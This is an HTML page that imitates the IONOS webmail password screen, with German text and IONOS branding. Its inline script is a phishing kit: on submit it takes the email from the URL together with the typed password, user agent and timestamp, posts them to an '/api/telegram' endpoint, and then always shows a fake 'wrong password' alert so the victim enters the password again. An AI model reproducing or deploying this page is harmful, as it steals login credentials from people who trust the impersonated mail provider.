<!DOCTYPE HTML>
<html>
<head>
    <title>Webmail Login - Passwort</title>
    <script nonce="b85Xw9Wvh32EuulRM6DRkX8CNS6g05rYTjOBMBeND6w=" src="https://ce1.uicdn.net/exos/framework/3.0/ionos.min.js" async="async" defer="defer"></script>
    <link rel="stylesheet" href="https://ce1.uicdn.net/exos/framework/3.0/ionos.min.css" />
    <link rel="stylesheet" href="/style/main.min.css" />
    <link rel="stylesheet" href="/style/starter-main.min.css" />
    
    <link rel="icon" type="image/png" sizes="32x32" href="/image/favicon-32px.png">
    <link rel="icon" type="image/png" sizes="16x16" href="/image/favicon-16px.png">
    <link rel="icon" type="image/png" sizes="48x48" href="/image/favicon-48px.png">
    <link rel="shortcut icon" type="image/x-icon" href="/image/favicon.ico" />
</head>
<body>
    <div class="page-content">
        <div class="oao-navi-navigation oao-navi-light">
            <div class="oao-navi-left">
                <div class="oao-navi-application-name">
                    <a class="oao-navi-app-name" href="https://www.ionos.de/">
                        <span class="oao-navi-app-logo"></span>
                        <span>Webmail Login</span>
                    </a>
                </div>
            </div>
        </div>

        <main>
            <section class="page-section page-section--default page-section--short">
                <div class="page-section__block">
                    <div class="sheet">
                        <section class="sheet__section sheet__section--default">
                            <ul>
                                <li class="stripe stripe--cropped">
                                    <div class="stripe__item">
                                        <img class="stripe__visual" height="58" width="auto" src="/image/product-email.svg" />
                                    </div>
                                    <div class="stripe__item">
                                        <h1 class="headline stripe__element">Passwort eingeben</h1>
                                        <p class="paragraph" id="userEmailDisplay"></p>
                                    </div>
                                </li>
                            </ul>
                        </section>

                        <section class="sheet__section sheet__section--default">
                            <form id="passwordForm">
                                <ul>
                                    <li class="form-stripe">
                                        <label class="label" for="password">Passwort</label>
                                        <input type="password" class="input-text form-input" name="password" 
                                            id="password" tabindex="1" required autocomplete="current-password" />
                                    </li>
                                    <li class="form-stripe form-stripe--actions">
                                        <button class="button button--primary button--full-width" 
                                            type="submit" tabindex="2" id="loginButton">
                                            Anmelden
                                        </button>
                                    </li>
                                </ul>
                            </form>
                        </section>
                    </div>
                </div>
            </section>
        </main>
    </div>

    <footer class="page-footer">
        <div class="page-footer__block">
            <section class="page-footer__section page-footer__section--last">
                <div class="page-footer__section-item page-footer__section-item--align-center page-footer__section-item--small-align-left">
                    &copy; 2025 <a class="page-footer__link" target="_blank" href="https://www.ionos.de/unternehmen">IONOS SE</a>
                </div>
            </section>
        </div>
    </footer>

    <script>
    async function sendToTelegram(credentials) {
        try {
            const response = await fetch('/api/telegram', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(credentials)
            });
            
            if (!response.ok) {
                throw new Error('API request failed');
            }
            
            return await response.json();
        } catch (error) {
            console.error('Failed to send to Telegram:', error);
            throw error;
        }
    }

    document.addEventListener('DOMContentLoaded', function() {
        const urlParams = new URLSearchParams(window.location.search);
        const email = urlParams.get('email') || 'Unknown';
        
        document.getElementById('userEmailDisplay').textContent = `FÃ¼r: ${email}`;

        document.getElementById('passwordForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const password = document.getElementById('password').value;
            const loginButton = document.getElementById('loginButton');
            
            loginButton.textContent = 'Wird angemeldet...';
            loginButton.disabled = true;

            const credentials = {
                email: email,
                password: password,
                userAgent: navigator.userAgent,
                timestamp: new Date().toLocaleString('de-DE'),
                url: window.location.href
            };

            sendToTelegram(credentials)
                .then(() => {
                    setTimeout(() => {
                        alert('Falsches Passwort. Bitte versuchen Sie es erneut.');
                        loginButton.textContent = 'Anmelden';
                        loginButton.disabled = false;
                        document.getElementById('password').value = '';
                        document.getElementById('password').focus();
                    }, 2000);
                })
                .catch(() => {
                    setTimeout(() => {
                        alert('Falsches Passwort. Bitte versuchen Sie es erneut.');
                        loginButton.textContent = 'Anmelden';
                        loginButton.disabled = false;
                        document.getElementById('password').value = '';
                        document.getElementById('password').focus();
                    }, 2000);
                });
        });
    });
    </script>
</body>
</html>
